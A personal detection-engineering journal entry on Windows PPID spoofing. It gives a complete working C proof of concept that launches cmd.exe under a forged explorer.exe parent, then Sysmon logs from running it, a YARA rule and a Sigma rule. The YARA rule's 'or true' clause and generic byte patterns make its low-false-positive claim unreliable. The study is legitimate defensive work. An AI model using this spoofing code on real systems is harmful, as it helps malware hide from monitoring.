# Roadmap V3 - Documentation 11: Wednesday 15 July 2026
## Summary:
Returned and executed Week 2's Secondary Iteration (which is the 6th iteration in general) of the Detection Engineering Project which was about PPID Spoofing!

## Documentation:
Today, I'm going to execute Week 2's Secondary Iteration which is about Parent Process ID Spoofing.

After researching, I've learned that in Windows, when a process spawns a new process, the Windows kernel inherently assigns the original process as the parent process since it is the one that spawned the other process. And security tools like EDRs, SIEMs, ... rely on this parent-child relationship to establish context and baselines. For example:
- explorer.exe spawns chrome.exe (Normal Behavior)
- w3wp.exe -> cmd.exe (Suspicious Behavior)

When a malware executes a malicious payload directly, it creates a highly suspicious parent-child link that instantly triggers alerts. The solution for that is PPID Spoofing. Since Windows Vista, Microsoft introduced "Process Attributes" via the STARTUPINFOEX structure. This feature was designed for legitimate purposes like allowing management services to spawn a worker process under a user's session process. However, attackers abused this by passing the handle of a legitimate, trusted process into the process creation attributes which forces the Windows kernel to explicitly document the trusted process as the parent in standard event logs.

This is the PoC code I'll be running for this iteration, I wrote it with the help of Gemini:
```c
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

// Helper function to dynamically find the PID of a target process name
DWORD GetProcessIdByName(const wchar_t* processName) {
    DWORD pid = 0;
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32W processEntry;
        processEntry.dwSize = sizeof(processEntry);
        if (Process32FirstW(snapshot, &processEntry)) {
            do {
                if (wcscmp(processEntry.szExeFile, processName) == 0) {
                    pid = processEntry.th32ProcessID;
                    break;
                }
            } while (Process32NextW(snapshot, &processEntry));
        }
        CloseHandle(snapshot);
    }
    return pid;
}

void SpoofPPID(DWORD parentPID) {
    STARTUPINFOEXA si = {0};
    PROCESS_INFORMATION pi = {0};
    SIZE_T attributeSize = 0;

    printf("[*] Target Parent PID identified: %lu\n", parentPID);

    si.StartupInfo.cb = sizeof(STARTUPINFOEXA);

    // 1. Open a handle to the desired fake parent process
    HANDLE hParentProcess = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, parentPID);
    if (hParentProcess == NULL) {
        printf("[-] Failed to open handle to target parent process. Error: %lu\n", GetLastError());
        return;
    }

    // 2. Allocate and initialize the explicit process attribute list
    InitializeProcThreadAttributeList(NULL, 1, 0, &attributeSize);
    si.lpAttributeList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attributeSize);
    if (si.lpAttributeList == NULL) {
        printf("[-] Heap allocation failed.\n");
        CloseHandle(hParentProcess);
        return;
    }

    if (!InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attributeSize)) {
        printf("[-] Failed to initialize attribute list. Error: %lu\n", GetLastError());
        HeapFree(GetProcessHeap(), 0, si.lpAttributeList);
        CloseHandle(hParentProcess);
        return;
    }

    // 3. Update the attribute list to declare the spoofed parent handle
    if (!UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, 
                                  &hParentProcess, sizeof(HANDLE), NULL, NULL)) {
        printf("[-] Failed to update attribute list. Error: %lu\n", GetLastError());
        DeleteProcThreadAttributeList(si.lpAttributeList);
        HeapFree(GetProcessHeap(), 0, si.lpAttributeList);
        CloseHandle(hParentProcess);
        return;
    }

    // 4. Spawn the target binary using the modified attribute configuration
    printf("[*] Spawning cmd.exe under spoofed parent...\n");
    if (!CreateProcessA("C:\\Windows\\System32\\cmd.exe", NULL, NULL, NULL, FALSE, 
                       EXTENDED_STARTUPINFO_PRESENT | CREATE_NEW_CONSOLE, NULL, NULL, &si.StartupInfo, &pi)) {
        printf("[-] CreateProcessA failed. Error: %lu\n", GetLastError());
    } else {
        printf("[+] Success! cmd.exe spawned with PID: %lu\n", pi.dwProcessId);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }

    // Cleanup
    DeleteProcThreadAttributeList(si.lpAttributeList);
    HeapFree(GetProcessHeap(), 0, si.lpAttributeList);
    CloseHandle(hParentProcess);
}

int main() {
    // We will target explorer.exe as our fake parent for this simulation
    const wchar_t* targetParent = L"explorer.exe";
    DWORD parentPID = GetProcessIdByName(targetParent);

    if (parentPID == 0) {
        printf("[-] Could not find the PID for %ls\n", targetParent);
        return 1;
    }

    SpoofPPID(parentPID);
    return 0;
}
```

Some code explanation:
- **STARTUPINFOEXA Structure:** Standard process creation uses STARTUPINFO. PPID spoofing requires the extended version, STARTUPINFOEX, which contains an extra member called lpAttributeList. This list holds the parameters that override default process creation behaviors.
- **OpenProcess:** To spoof a parent, we must first get a handle to it.
- **InitializeProcThreadAttributeList**: We used this twice:
    - **First call:** We pass NULL for the list. Windows looks at the arguments and calculates exactly how many bytes of memory are needed, saving it in attributeSize.
    - **Second call:** We pass the newly allocated memory pointer (si.lpAttributeList) to actually initialize the structure.
- **UpdateProcThreadAttribute:** We pass the flag PROC_THREAD_ATTRIBUTE_PARENT_PROCESS and point it to the handle (hParentProcess) of the fake parent.
- **CreateProcessA:** We spawn cmd.exe. The flag EXTENDED_STARTUPINFO_PRESENT tells Windows to not just look at standard startup info, but look at the extended attributes list we just populated instead.

With the code complete, now it's time to make a YARA rule! Since this is an executable, the YARA rule needs to import the PE  library! I'm going to catch the combination of words that indicate the attack. I'm going to catch:
**1. Mandatory KeyWords:**
- **UpdateProcThreadAttribute:** After learning about this attack, I found that this is a core technique alongside the keyword "PROC_THREAD_ATTRIBUTE_PARENT_PROCESS"!
- **InitializeProcThreadAttributeList:** It sets the memory layout for the attributes
- **CreateProcessA / CreateProcessW:** A main part of this attack since attackers must create a process in the end. I'll count the two versions just in case!
- **OpenProcess:** To get the PID of the process, we need to open it. So I believe that this is mandatory

**2. Optional Keywords:**
- **CreateToolhelp32Snapshot:** I used this to dynamically find the PID of the target process. It's not a required function for this attack since an attacker can hard code the PID.
- **Process32FirstW / Process32NextW:** these are optional because they go with "CreateToolhelp32Snapshot"

And since I'll be using the pe library, I'll be searching for constant values too:
- **EXTENDED_STARTUPINFO_PRESENT (Value: 0x00080000):** This is the value passed to CreateProcessA. If an executable calls CreateProcess but doesn't include this flag, it can't look at the spoofed parent attribute.
- **PROC_THREAD_ATTRIBUTE_PARENT_PROCESS (Value: 0x00020005):** This is the flag I mentioned above that goes with "UpdateProcThreadAttribute"

This is my final YARA rule:
```yar
import "pe"

rule PPID_Spoofing {
	meta:
		description = "Detects PPID Spoofing Attack Indicators"
		date = "2026-07-15"
		severity = "High"
	
	strings:
		// Goes with CreateProcessA/W
		$extended_startup_info = {00 00 08 00}

		// Goes with UpdateProcThreadAttribute
		$proc_thread_attribute_parent_proc = {05 00 02 00}
	
	condition:
		uint16(0) == 0x5A4D and
		pe.is_pe and
		pe.imports("kernel32.dll", "UpdateProcThreadAttribute") and
		$proc_thread_attribute_parent_proc and
		(
			pe.imports("kernel32.dll", "CreateProcessA") or
			pe.imports("kernel32.dll", "CreateProcessW")
		) and
		$extended_startup_info and
		pe.imports("kernel32.dll", "InitializeProcThreadAttributeList") and
		pe.imports("kernel32.dll", "OpenProcess") and
		(
			pe.imports("kernel32.dll", "CreateToolhelp32Snapshot") or
			pe.imports("kernel32.dll", "Process32FirstW") or
			pe.imports("kernel32.dll", "Process32NextW") or
			true
		)
}
```

The last block was for the optional keywords! This was tricky since I saw multiple ways for this while searching!

The approach I went with is to make the keywords mandatory (by adding "and" before the block) but also add a "or true" condition at the end to prevent failing the whole rule if none of the optional keywords are present!

I don't believe that this will produce false positives since all other keywords still must be true to trigger the rule!

Technically, what I saw while searching is that optional keywords must not be included in the logic from the first place since adding an "or" operator before the optional block will break the logic completely by converting it to an "or" logic! But at the same time, keeping an "and" operator before the optional block and adding the "true" keyword is kind of meaningless since with optimization the engine will see "or true" and knows that this will always be true, so it will skip all the other optional keywords completely!

I don't know, I'll keep it the way I did it for now and after finishing this iteration I'll research it more to get a better idea on the approach!

Now, it's time to test the executable, see the Sysmon logs on Splunk, and make Sigma rules for it!

Running the attack generated these logs:
**Event 1:**
- `<EventID>1</EventID>`
- `<Data Name='Image'>C:\Users\Snow\Desktop\attack6-ppid-spoofing.exe</Data>`
- `<Data Name='CommandLine'>"C:\Users\Snow\Desktop\attack6-ppid-spoofing.exe"</Data>`
- `<Data Name='ParentImage'>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>`
- `<Data Name='ParentCommandLine'>C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe</Data>`

Clearly shows that the attack executable was launched via PowerShell.

**Event 2:**
- `<EventID>1</EventID>`
- `<Data Name='Image'>C:\Windows\System32\cmd.exe</Data>`
- `<Data Name='OriginalFileName'>Cmd.Exe</Data>`
- `<Data Name='CommandLine'>"C:\Windows\System32\cmd.exe"</Data>`
- `<Data Name='CurrentDirectory'>C:\Users\Snow\Desktop\</Data>`
- `<Data Name='ParentImage'>C:\Windows\explorer.exe</Data>`
- `<Data Name='ParentCommandLine'>C:\WINDOWS\Explorer.EXE</Data>`

Unbelievable to be honest! This shows that cmd was launched via explorer.exe!

**Event 3:**
- `<EventID>5</EventID>`
- `<Data Name='Image'>C:\Users\Snow\Desktop\attack6-ppid-spoofing.exe</Data>`

Shows that the attack executable closed.

**Event 4:**
- `<EventID>1</EventID>`
- `<Data Name='Image'>C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.24.11911.0_x64__8wekyb3d8bbwe\OpenConsole.exe</Data>`
- `<Data Name='OriginalFileName'>OpenConsole.exe</Data>`
- `<Data Name='CommandLine'>"C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.24.11911.0_x64__8wekyb3d8bbwe\OpenConsole.exe" -Embedding</Data>`
- `<Data Name='ParentImage'>C:\Windows\System32\svchost.exe</Data>`
- `<Data Name='ParentCommandLine'>C:\WINDOWS\system32\svchost.exe -k DcomLaunch -p</Data>`

This event was generated because in the attack code there is the CREATE_NEW_CONSOLE flag inside the CreateProcessA function "EXTENDED_STARTUPINFO_PRESENT | CREATE_NEW_CONSOLE"!

Putting the 4th event on the side, the first 3 events clearly show a story! Event 1 shows that an executable was launched via PowerShell. Then in the second event, CMD was launched via explorer. Finally in the 3rd event, the attack executable is closed! To be honest just reading this looks normal at first glance, but the timing of these 3 events shows a totally different thing!

The first event was created at 2:45:09.718 PM, the second at 2:45:09.750 PM, the 3rd at 2:45:09.756 PM, finally the 4th at 2:45:09.807 PM!

Less than 100 ms between the first and the last event! That's unrealistic fast to open two EXEs (supposably from different folder locations) and close 1! It clearly indicates that the first process (the attack exe) opened CMD and faked its parent! The 4th event also signals this by stating that there is a new console that has been launched!

In addition to that, I explicitly stated in Event 2 the current directory tag, which showed that the current directory is Desktop! There is no CMD in the Desktop folder to be opened! The attack executable is! This is also another indicator of the attack!

Based on this information, I can take advantage of the attack weakness (showing the current directory) to make a Sigma rule!

I can state that if a terminal was opened with explorer as its parent, and the current directory is Downloads / AppData / Public / Desktop, then make an alert! But I feel that this alert is still very limited, it's very specific! What if the spoofed parent was a different process than explorer?

I searched online for the top spoofed executables and these what I found:
- explorer.exe
- svchost.exe
- runtimebroker.exe
- taskhostw.exe
- lsass.exe
- services.exe
- winlogon.exe
- spoolsv.exe
- winword.exe
- excel.exe
- powerpnt.exe

So I'll add all these to the rule, making it more versatile!

With that, this is the full Sigma rule:
```yml
title: PPID Spoofing Attack
description: Detects PPID Spoofing Indicators
date: 2026/07/15
logsource:
  product: windows
  service: sysmon
detection:
  event:
    EventID: 1
  parent_image:
    ParentImage|endswith:
      - '\explorer.exe'
      - '\svchost.exe'
      - '\taskhostw.exe'
      - '\runtimebroker.exe'
      - '\services.exe'
      - '\lsass.exe'
      - '\winlogon.exe'
      - '\spoolsv.exe'
      - '\winword.exe'
      - '\excel.exe'
  target_image:
    Image|endswith:
      - '\cmd.exe'
      - '\powershell.exe'
      - '\pwsh.exe'
  current_directory:
    CurrentDirectory|contains:
      - '\Desktop\'
      - '\Downloads\'
      - '\AppData\'
      - '\Users\Public\'
  condition: event and parent_image and target_image and current_directory
level: high
```

**Reflection:**  
This was a really interesting and fun iteration to make! I've learned new concepts and practiced Sigma and YARA more from it!

**Note:**  
Unfortunately, I won't be making the final iterations (at least for now) since I don't have enough time to do them! I have to refine my GitHub page, transfer my old documentations from my old portfolio website that I don't use anymore to GitHub since now my old projects including the kernel drivers and the CrackMe ones are just code without documentation right now! Finally, I need to review my old projects! So if I find the time to continue with the iterations, I'll absolutely continue, but for now, no promises!